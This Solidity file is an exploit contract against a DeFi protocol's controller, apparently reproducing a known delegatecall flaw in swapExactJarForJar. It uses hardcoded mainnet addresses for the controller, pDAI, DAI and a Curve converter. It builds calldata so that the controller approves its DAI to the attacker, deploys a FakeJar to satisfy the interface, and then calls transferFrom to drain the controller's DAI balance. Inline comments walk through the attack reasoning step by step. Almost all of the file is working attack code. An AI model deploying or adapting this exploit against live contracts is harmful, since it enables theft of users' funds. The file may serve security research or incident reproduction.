pragma solidity ^0.6.7;
pragma experimental ABIEncoderV2;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IController {
    function swapExactJarForJar(
        address _fromJar,
        address _toJar,
        uint256 _fromJarAmount,
        uint256 _toJarMinAmount,
        address[] calldata _targets,
        bytes[] calldata _data
    ) external returns (uint256);
}

contract Strategy {
    address public constant controller = 0x6847259b2B3A4c17e7c43C54409810aF48bA5210;
    address public constant pDAI = 0x6949Bb274A6Be2703B22247a78f5543299b99bfe;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant curveProxyLogic = 0x6186E99D979664D3701Af2E44be1d00330923C7d;

    function run() public {
        // The vulnerability is in ControllerV4.swapExactJarForJar
        // It delegatecalls into approved targets.
        // curveProxyLogic (0x6186E99D979664D3701Af2E44be1d00330923C7d) is an approved converter.

        address[] memory targets = new address[](1);
        targets[0] = curveProxyLogic;

        bytes[] memory data = new bytes[](1);
        // Since it's a delegatecall from the Controller, we can call DAI.approve(attacker, amount)
        // but we need to call it on the DAI contract. 
        // curveProxyLogic doesn't have an 'approve' function, but we can use any function 
        // that performs a call to an arbitrary address if available, or just exploit 
        // the fact that we can pass ANY data to the delegatecall.

        // Wait, the _execute function does: delegatecall(gas, _target, _data)
        // This means it executes _target's code with _data in Controller's context.
        // If we use curveProxyLogic as target, we are limited to its code.
        // However, we can call curveProxyLogic.add_liquidity which takes an 'underlying' address
        // and calls 'underlying.safeApprove(curve, amount)'.

        // Function signature: add_liquidity(address curve, bytes4 curveFunctionSig, uint256 curvePoolSize, uint256 curveUnderlyingIndex, address underlying)
        // This will call underlying.approve(curve, amount)

        data[0] = abi.encodeWithSignature(
            "add_liquidity(address,bytes4,uint256,uint256,address)",
            address(this), // curve (spender)
            bytes4(0x00000000), // sig
            uint256(0), // poolSize
            uint256(0), // index
            DAI // underlying (token to approve)
        );

        // We need a fake Jar to satisfy the interface
        FakeJar fakeJar = new FakeJar();

        // We need to call it multiple times to drain different assets or just get a huge approval
        for(uint i=0; i<5; i++) {
            try IController(controller).swapExactJarForJar(
                pDAI,
                address(fakeJar),
                0,
                0,
                targets,
                data
            ) {} catch {}
        }

        uint256 controllerDai = IERC20(DAI).balanceOf(controller);
        if (controllerDai > 0) {
            IERC20(DAI).transferFrom(controller, address(this), controllerDai);
        }
    }
}

contract FakeJar {
    function token() external view returns (address) { return 0x6B175474E89094C44Da98b954EedeAC495271d0F; }
    function getRatio() external view returns (uint256) { return 1e18; }
    function decimals() external view returns (uint8) { return 18; }
    function withdraw(uint256) external {}
    function deposit(uint256) external {}
    function balanceOf(address) external view returns (uint256) { return 0; }
    function transfer(address, uint256) external returns (bool) { return true; }
}
